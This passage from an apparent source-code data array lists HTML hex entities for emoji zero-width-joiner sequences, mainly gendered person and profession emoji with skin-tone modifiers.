'&#x1f64e;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f64e;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f64e;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f64e;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f64e;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f6a3;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f6a3;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f6a3;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f6a3;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f6a3;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f6a3;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f6a3;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f6a3;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f6a3;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f6a3;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f6b4;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f6b4;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f6b4;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f6b4;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f6b4;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f6b4;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f6b4;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f6b4;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f6b4;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f6b4;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f6b5;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f6b5;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f6b5;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f6b5;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f6b5;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f6b5;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f6b5;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f6b5;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f6b5;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f6b5;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f6b6;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f6b6;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f6b6;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f6b6;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f6b6;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f6b6;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f6b6;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f6b6;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f6b6;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f6b6;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f926;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f926;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f926;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f926;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f926;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f926;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f926;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f926;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f926;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f926;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f935;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f935;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f935;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f935;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f935;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f935;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f935;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f935;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f935;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f935;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f937;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f937;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f937;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f937;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f937;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f937;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f937;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f937;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f937;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f937;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f938;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f938;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f938;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f938;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f938;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f938;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f938;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f938;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f938;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f938;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f939;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f939;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f939;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f939;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f939;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f939;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f939;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f939;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f939;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f939;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f93d;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f93d;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f93d;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f93d;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f93d;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f93d;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f93d;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f93d;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f93d;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f93d;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f93e;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f93e;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f93e;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f93e;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f93e;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f93e;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f93e;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f93e;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f93e;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f93e;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f9b8;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f9b8;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f9b8;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f9b8;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f9b8;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f9b8;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f9b8;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f9b8;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f9b8;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f9b8;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f9b9;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f9b9;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f9b9;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f9b9;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f9b9;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f9b9;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f9b9;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f9b9;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f9b9;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f9b9;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f9cd;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f9cd;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f9cd;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f9cd;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f9cd;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f9cd;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f9cd;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f9cd;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f9cd;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f9cd;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f9ce;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f9ce;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f9ce;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f9ce;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f9ce;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f9ce;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f9ce;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f9ce;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f9ce;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f9ce;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f9cf;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f9cf;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f9cf;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f9cf;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f9cf;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f9cf;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f9cf;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f9cf;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f9cf;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f9cf;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x2695;&#xfe0f;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x2696;&#xfe0f;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x2708;&#xfe0f;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x2695;&#xfe0f;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x2696;&#xfe0f;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x2708;&#xfe0f;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x2695;&#xfe0f;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x2696;&#xfe0f;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x2708;&#xfe0f;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x2695;&#xfe0f;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x2696;&#xfe0f;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x2708;&#xfe0f;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x2695;&#xfe0f;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x2696;&#xfe0f;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x2708;&#xfe0f;', '&#x1f9d4;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d4;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d4;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d4;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d4;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d4;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d4;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d4;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d4;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d4;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d6;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d6;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d6;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d6;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d6;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d6;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d6;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d6;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d6;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d6;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d7;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d7;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d7;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d7;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d7;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d7;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d7;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d7;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d7;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d7;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d8;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d8;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d8;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d8;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d8;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d8;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d8;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d8;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d8;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d8;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d9;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d9;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d9;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d9;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d9;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d9;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d9;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d9;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d9;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d9;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f9da;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f9da;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f9da;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f9da;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f9da;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f9da;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f9da;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f9da;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f9da;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f9da;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f9db;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f9db;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f9db;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f9db;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f9db;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f9db;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f9db;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f9db;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f9db;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f9db;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f9dc;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f9dc;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f9dc;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f9dc;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f9dc;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f9dc;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f9dc;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f9dc;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f9dc;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f9dc;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f9dd;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f9dd;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f9dd;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f9dd;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f9dd;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f9dd;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f9dd;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f9dd;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f9dd;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f9dd;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f3cb;&#xfe0f;&#x200d;&#x2640;&#xfe0f;', '&#x1f3cb;&#xfe0f;&#x200d;&#x2642;&#xfe0f;', '&#x1f3cc;&#xfe0f;&#x200d;&#x2640;&#xfe0f;', '&#x1f3cc;&#xfe0f;&#x200d;&#x2642;&#xfe0f;', '&#x1f3f3;&#xfe0f;&#x200d;&#x26a7;&#xfe0f;', '&#x1f574;&#xfe0f;&#x200d;&#x2640;&#xfe0f;', '&#x1f574;&#xfe0f;&#x200d;&#x2642;&#xfe0f;', '&#x1f575;&#xfe0f;&#x200d;&#x2640;&#xfe0f;', '&#x1f575;&#xfe0f;&#x200d;&#x2642;&#xfe0f;', '&#x26f9;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x26f9;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x26f9;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x26f9;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x26f9;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x26f9;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x26f9;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x26f9;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x26f9;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x26f9;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x26f9;&#xfe0f;&#x200d;&#x2640;&#xfe0f;', '&#x26f9;&#xfe0f;&#x200d;&#x2642;&#xfe0f;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f33e;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f373;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f37c;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f384;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f393;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f3a4;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f3a8;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f3eb;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f3ed;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f4bb;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f4bc;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f527;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f52c;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f680;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f692;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f9af;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f9b0;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f9b1;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f9b2;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f9b3;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f9bc;', '&#x1f468;&#x1f3fb;&#x200d;&#x1f9bd;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f33e;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f373;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f37c;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f384;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f393;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f3a4;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f3a8;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f3eb;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f3ed;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f4bb;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f4bc;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f527;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f52c;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f680;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f692;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f9af;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f9b0;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f9b1;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f9b2;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f9b3;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f9bc;', '&#x1f468;&#x1f3fc;&#x200d;&#x1f9bd;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f33e;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f373;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f37c;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f384;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f393;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f3a4;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f3a8;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f3eb;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f3ed;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f4bb;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f4bc;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f527;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f52c;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f680;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f692;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f9af;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f9b0;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f9b1;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f9b2;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f9b3;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f9bc;', '&#x1f468;&#x1f3fd;&#x200d;&#x1f9bd;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f33e;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f373;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f37c;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f384;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f393;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f3a4;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f3a8;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f3eb;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f3ed;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f4bb;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f4bc;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f527;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f52c;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f680;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f692;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f9af;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f9b0;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f9b1;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f9b2;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f9b3;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f9bc;', '&#x1f468;&#x1f3fe;&#x200d;&#x1f9bd;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f33e;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f373;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f37c;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f384;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f393;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f3a4;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f3a8;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f3eb;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f3ed;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f4bb;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f4bc;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f527;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f52c;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f680;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f692;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f9af;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f9b0;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f9b1;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f9b2;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f9b3;', '&#x1f468;&#x1f3ff;&#x200d;&#x1f9bc;', 